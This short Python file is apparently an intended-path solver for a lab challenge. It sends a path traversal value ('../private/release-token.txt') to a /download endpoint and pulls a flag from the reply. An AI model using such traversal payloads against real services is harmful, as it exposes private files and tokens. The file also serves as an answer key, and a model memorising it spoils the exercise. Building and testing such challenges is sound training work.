"""Intended-path solver: path traversal file read."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.get(
        f"{ctx.url()}/download",
        params={"name": "../private/release-token.txt"},
        timeout=10,
    )
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="traversal-download",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "no flag in response",
            )
        ]
    )
